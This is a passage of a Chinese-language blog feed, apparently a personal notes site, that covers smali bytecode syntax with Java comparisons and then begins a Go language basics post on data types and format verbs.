class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 声明静态字段<br>.field [权限修饰符] [静态修饰符] final [&lt;变量名&gt;:&lt;变量全类名路径&gt;];=常量值<br>.field private static final a:Ljava/lang/String;<br><br>XXX-object v0, p0, L[类];-&gt;[变量名]:L[类型];<br>put赋值<br>get 取值<br><br># 将 p0 中的值赋值给 b<br>iget-object v0, p0, Ltest/test;-&gt;b:Ljava/lang/String;<br># 将 v0 赋值给 p0，然后将 p0 中的值赋值给 b<br>iput-object v0, p0, Ltest/test;-&gt;b:Ljava/lang/String;<br><br># 静态<br># 将 p0 中的值赋值给 b<br>sget-object v0, Ltest/test;-&gt;d:Ljava/lang/String;<br># 将 v0 赋值给 p0，然后将 p0 中的值赋值给 d<br>sput-object v0, p0, Ltest/test;-&gt;d:Ljava/lang/String;<br><br>instance<br>static<br></code></pre></td></tr></table></figure><table><thead><tr><th>取&#x2F;赋值</th><th>java</th></tr></thead><tbody><tr><td>iget-byte <br>iput-byte <br>const&#x2F;4</td><td>byte</td></tr><tr><td>iget-short <br>iput-short <br>const&#x2F;4</td><td>short</td></tr><tr><td>iget <br>iput <br>const&#x2F;4</td><td>int</td></tr><tr><td>iget-wide <br>iput-wide <br>const-wide&#x2F;16</td><td>long</td></tr><tr><td>iget <br>iput <br>const&#x2F;high16</td><td>float</td></tr><tr><td>iget-wide <br>iput-wide <br>const&#x2F;high16</td><td>double</td></tr><tr><td>iget-char <br>iput-char <br>const&#x2F;16</td><td>char</td></tr><tr><td>iget-boolean <br>iput-boolean <br>const&#x2F;4</td><td>boolean</td></tr></tbody></table><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class test &#123;<br>    String b =&quot;q&quot;;<br>    String c=b;<br>    private static final int a=1;<br>    public static String d=&quot;d&quot;;<br>    public static void main(String[] args) &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest;# 声明类（必须）<br>.super Ljava/lang/Object# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>.line 4# 第 4 行<br>const-string v0, &quot;q&quot;# 将 q 赋值给 v0<br># 将 p0 中的值赋值给 b<br>iput-object v0, p0, Ltest/test;-&gt;b:Ljava/lang/String;<br><br>.line 5<br># 将 p0 中的值赋值给 b<br>iget-object v0, p0, Ltest/test;-&gt;b:Ljava/lang/String;<br># 将 p0 中的值赋值给 b<br>iput-object v0, p0, Ltest/test;-&gt;c:Ljava/lang/String;<br><br>.field private static final a:Ljava/lang/String; = &quot;q&quot;<br><br># 将 v0 赋值给 p0，然后将 p0 中的值赋值给 d<br>sput-object v0, Ltest/test;-&gt;d:Ljava/lang/String;<br></code></pre></td></tr></table></figure><h1 id="跳转分支"><a href="#跳转分支" class="headerlink" title="跳转分支"></a>跳转分支</h1><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>if-gt</td><td>大于</td></tr><tr><td>if-eq</td><td>等于</td></tr><tr><td>if-lt</td><td>小于</td></tr><tr><td>if-ne</td><td>不等于</td></tr><tr><td>if-ge</td><td>大于等于</td></tr><tr><td>if-le</td><td>小于等于</td></tr><tr><td>if-gtz</td><td>大于0</td></tr><tr><td>if-eqz</td><td>等于0</td></tr><tr><td>if-ltz</td><td>小于0</td></tr><tr><td>if-nez</td><td>不等于0</td></tr><tr><td>if-gez</td><td>大于等于0</td></tr><tr><td>if-lez</td><td>小于等于0</td></tr></tbody></table><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int a=1,b=2;<br>if(a&gt;b)&#123;<br>System.out.println(&quot;test&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.line 6<br>.local v1, &quot;b&quot;:I<br># 如果 v0 小于等于 v1 则跳转到 cond_b<br>if-le v0, v1, :cond_b<br><br>.line 7<br>sget-object v2, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br><br>const-string v3, &quot;test&quot;<br><br>invoke-virtual &#123;v2, v3&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br><br>.line 9<br>:cond_b<br></code></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs (">.method [权限修饰符] [静态修饰符] [方法名(参数类型)返回类型]<br>.end method# 结尾标志<br></code></pre></td></tr></table></figure><p><strong>返回类型</strong></p><table><thead><tr><th>参数</th><th>数据类型</th></tr></thead><tbody><tr><td>return</td><td>byte</td></tr><tr><td>return</td><td>short</td></tr><tr><td>return</td><td>int</td></tr><tr><td>return</td><td>float</td></tr><tr><td>return</td><td>char</td></tr><tr><td>return</td><td>boolean</td></tr><tr><td>return-wide</td><td>long</td></tr><tr><td>return-wide</td><td>double</td></tr><tr><td>return-void</td><td>void</td></tr><tr><td>return-object</td><td>数组</td></tr><tr><td>return-object</td><td>object</td></tr></tbody></table><h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">invoke-virtual &#123;[参数]&#125;, [方法所属类名];-&gt;[方法名](参数类型)返回值<br>invoke-static &#123;&#125;, Ltest/test;-&gt;qq(Ljava/lang/String;)Ljava/lang/String;<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>invoke-virtual</td><td>调用普通的实例方法</td></tr><tr><td>invoke-direct</td><td>调用私有方法和构造方法</td></tr><tr><td>invoke-static</td><td>调用静态方法</td></tr><tr><td>invoke-super</td><td>调用父类方法</td></tr><tr><td>invoke-interface</td><td>调用接口方法</td></tr></tbody></table><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>public static String qq()<br>&#123;<br>return &quot;qq&quot;;<br>&#125;<br>public static ww(String a)&#123;<br>return qq();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>.method public static qq()Ljava/lang/String;<br>.registers 1# 方法所用到的变量个数<br><br>.prologue<br>.line 6# 下面代码所对应的行<br>const-string v0, &quot;qq&quot;# 定义字符串类型变量，并将 qq 赋值给 v0<br><br># 返回<br>return-object v0<br># 结束<br>.end method<br><br>.method public static ww(Ljava/lang/String;)Ljava/lang/String;<br>    .registers 2# 方法所用到的变量个数<br>    .param p0, &quot;a&quot;# 形参名<br>    <br>    .prologue<br>    .line 10# 下面代码所对应的行<br>    # 调用静态 test 类中的 qq 方法，返回字符串<br>    invoke-static &#123;&#125;, Ltest/test;-&gt;qq()Ljava/lang/String;<br><br>    move-result-object v0<br><br># 返回对象<br>    return-object v0<br># 结束<br>.end method<br></code></pre></td></tr></table></figure><h2 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h2><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>public static void qqq()&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>.method public static Test()V<br><br>return-void<br>.end method<br></code></pre></td></tr></table></figure><h2 id="有参数"><a href="#有参数" class="headerlink" title="有参数"></a>有参数</h2><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>public static void qqq(String a,int b)&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>.method public static Test(Ljava/lang/String;I)V<br><br>return-void<br>.end method<br></code></pre></td></tr></table></figure><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.method [权限修饰符] constructor &lt;init&gt; [(参数类型)返回类型]<br>.end method<br></code></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>public Test(String a)&#123;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>.method public constructor &lt;init&gt;(Ljava/lang/String;)V<br># 调用父类构造方法<br>invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V<br><br>    return-void<br>.end method<br></code></pre></td></tr></table></figure><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.method [权限修饰符] static constructor &lt;clinit&gt; [(参数类型)返回类型]<br>.end method<br></code></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>static&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>.method public static constructor &lt;clinit&gt;()V<br><br>    return-void<br>.end method<br></code></pre></td></tr></table></figure><h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class [修饰符] L+[类名];<br>.class public LTest<br>.class public lcom/test/Test;<br>.class public static lcom/test/Test;<br><br># 继承 object 类<br>.super Ljava/lang/Object;<br># 对应的java文件<br>.source &quot;Qq.java&quot;<br># 实现接口<br>.implements Ljava/lang/CharSequence;<br></code></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.implements Ljava/lang/charSequence;# 实现接口<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br></code></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 声明实例<br>new-instance [变量名], [全包名路径]<br>new-instance v0, Ltest/test;<br><br># 调用构造方法<br>invoke-direct &#123;[变量名]&#125;, [全包名路径];-&gt;&lt;init&gt;([参数])[返回类型]<br>invoke-direct &#123;v0&#125;, Ltest/test;-&gt;&lt;init&gt;()V<br></code></pre></td></tr></table></figure><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test Q = new test();<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br># 声明实例<br>new-instance v0, Ltest/test;<br># 调用<br>invoke-direct &#123;v0&#125;, Ltest/test;-&gt;&lt;init&gt;()V<br></code></pre></td></tr></table></figure><h2 id="字节码对象赋值"><a href="#字节码对象赋值" class="headerlink" title="字节码对象赋值"></a>字节码对象赋值</h2><p><strong>java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package test;<br><br>public class test &#123;<br>    public static void main(String[] args) &#123;<br>        System.out.println(test.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>smali</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.class public LTest:# 声明类（必须）<br>.super Ljava/lang/Object;# 声明父类（默认继承Object）（必须）<br>.source &quot;Test.java&quot;# 源码文件（非必须）<br><br>const-class v1, Ltest/test;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> smali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> smali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/Golang/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/Golang/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br>import (<br>&quot;fmt&quot;<br>)<br><br>func main() &#123;<br>var test = &quot;Hello World&quot;<br>var test2 = &quot;test2&quot;<br>test3 := &quot;test3&quot;<br><br>fmt.Println(test)<br>fmt.Println(test2)<br>fmt.Println(test3)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><ul><li><code>int</code>：根据底层架构自动选择大小的有符号整数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var a int = 42<br></code></pre></td></tr></table></figure><ul><li><code>int8</code>、<code>int16</code>、<code>int32</code>、<code>int64</code>：有符号整数，分别表示8位、16位、32位、64位大小。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var b int16 = 32767<br></code></pre></td></tr></table></figure><ul><li><code>uint</code>：根据底层架构自动选择大小的无符号整数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var c uint = 100<br></code></pre></td></tr></table></figure><ul><li><code>uint8</code>、<code>uint16</code>、<code>uint32</code>、<code>uint64</code>：无符号整数，分别表示8位、16位、32位、64位大小。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var d uint32 = 4294967295<br></code></pre></td></tr></table></figure><h2 id="浮点数类型"><a href="#浮点数类型" class="headerlink" title="浮点数类型"></a>浮点数类型</h2><ul><li><code>float32</code>：单精度浮点数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var e float32 = 3.14<br></code></pre></td></tr></table></figure><ul><li><code>float64</code>：双精度浮点数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var f float64 = 3.14159265359<br></code></pre></td></tr></table></figure><h2 id="复数类型"><a href="#复数类型" class="headerlink" title="复数类型"></a>复数类型</h2><ul><li><code>complex64</code>：包含32位实部和32位虚部的复数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var g complex64 = 2 + 3i<br></code></pre></td></tr></table></figure><ul><li><code>complex128</code>：包含64位实部和64位虚部的复数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var h complex128 = 4 + 5i<br></code></pre></td></tr></table></figure><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><ul><li><code>bool</code>：表示真或假值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var i bool = true<br></code></pre></td></tr></table></figure><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><ul><li><code>string</code>：表示文本字符串。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var j string = &quot;Hello, World!&quot;<br></code></pre></td></tr></table></figure><h2 id="数组（Arrays）"><a href="#数组（Arrays）" class="headerlink" title="数组（Arrays）"></a>数组（Arrays）</h2><ul><li>固定大小的元素集合，所有元素具有相同的数据类型。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var arr [5]int<br>arr[0] = 1<br>arr[1] = 2<br></code></pre></td></tr></table></figure><h2 id="切片（Slices）"><a href="#切片（Slices）" class="headerlink" title="切片（Slices）"></a>切片（Slices）</h2><ul><li>动态大小的元素序列，底层基于数组实现。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">slice := []int&#123;1, 2, 3, 4, 5&#125;<br></code></pre></td></tr></table></figure><h2 id="映射（Maps）"><a href="#映射（Maps）" class="headerlink" title="映射（Maps）"></a>映射（Maps）</h2><ul><li>无序的键-值对集合。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">m := make(map[string]int)<br>m[&quot;apple&quot;] = 10<br>m[&quot;banana&quot;] = 5<br></code></pre></td></tr></table></figure><h2 id="结构体（Structs）"><a href="#结构体（Structs）" class="headerlink" title="结构体（Structs）"></a>结构体（Structs）</h2><ul><li>自定义的复合数据类型，包含不同类型的字段。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type Person struct &#123;<br>    Name string<br>    Age  int<br>&#125;<br><br>person := Person&#123;<br>    Name: &quot;Alice&quot;,<br>    Age:  30,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="接口（Interfaces）"><a href="#接口（Interfaces）" class="headerlink" title="接口（Interfaces）"></a>接口（Interfaces）</h2><ul><li>一组方法的抽象集合，实现了接口的类型可以调用这些方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">type Writer interface &#123;<br>    Write([]byte) (int, error)<br>&#125;<br><br>type FileWriter struct &#123;<br>    // Implement the Write method<br>&#125;<br><br>func (f FileWriter) Write(data []byte) (int, error) &#123;<br>    // Implement the Write method<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="指针（Pointers）"><a href="#指针（Pointers）" class="headerlink" title="指针（Pointers）"></a>指针（Pointers）</h2><ul><li>存储变量的内存地址。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var ptr *int<br>x := 42<br>ptr = &amp;x<br></code></pre></td></tr></table></figure><h2 id="通道（Channels）"><a href="#通道（Channels）" class="headerlink" title="通道（Channels）"></a>通道（Channels）</h2><ul><li>用于在不同goroutines之间进行通信和同步的数据结构。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ch := make(chan int)<br>go func() &#123;<br>    ch &lt;- 42<br>&#125;()<br>result := &lt;-ch<br></code></pre></td></tr></table></figure><h2 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h2><ul><li>函数也是一种数据类型，可以作为参数传递给其他函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func add(a, b int) int &#123;<br>    return a + b<br>&#125;<br><br>func subtract(a, b int) int &#123;<br>    return a - b<br>&#125;<br><br>var operation func(int, int) int<br>operation = add<br>result := operation(5, 3) // result is 8<br>operation = subtract<br>result = operation(5, 3) // result is 2<br></code></pre></td></tr></table></figure><h2 id="切片类型"><a href="#切片类型" class="headerlink" title="切片类型"></a>切片类型</h2><ul><li>切片本身也是一种数据类型，可以用于切片操作和传递数据。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nums := []int&#123;1, 2, 3, 4, 5&#125;<br>subSlice := nums[1:4] // subSlice contains [2, 3, 4]<br></code></pre></td></tr></table></figure><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><table><thead><tr><th>占位符</th><th>描述</th></tr></thead><tbody><tr><td><code>%v</code></td><td>默认格式化，适用于大多数类型。</td></tr><tr><td><code>%+v</code></td><td>在结构体中，显示字段名和值。</td></tr><tr><td><code>%#v</code></td><td>输出值的Go语法表示形式。</td></tr><tr><td><code>%T</code></td><td>输出值的类型。</td></tr><tr><td><code>%t</code></td><td>格式化布尔值。</td></tr><tr><td><code>%b</code></td><td>格式化整数为二进制。</td></tr><tr><td><code>%c</code></td><td>输出字符（Unicode码点所对应的字符）。</td></tr><tr><td><code>%d</code></td><td>格式化整数为十进制。</td></tr><tr><td><code>%o</code></td><td>格式化整数为八进制。</td></tr><tr><td><code>%x</code>, <code>%X</code></td><td>格式化整数为十六进制，分别使用小写和大写字母。</td></tr><tr><td><code>%e</code>, <code>%E</code></td><td>格式化浮点数为科学计数法，分别使用小写和大写字母。</td></tr><tr><td><code>%f</code></td><td>格式化浮点数为普通小数。</td></tr><tr><td><code>%g</code>, <code>%G</code></td><td>根据值的大小，自动选择<code>%e</code>或<code>%f</code>，分别使用小写和大写字母。</td></tr><tr><td><code>%s</code></td><td>格式化字符串。</td></tr><tr><td><code>%q</code></td><td>输出带有引号的字符串。</td></tr><tr><td><code>%p</code></td><td>输出指针的十六进制表示。</td></tr></tbody></table><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><h3 id="加法运算符"><a href="#加法运算符" class="headerlink" title="加法运算符 +"></a>加法运算符 <code>+</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code 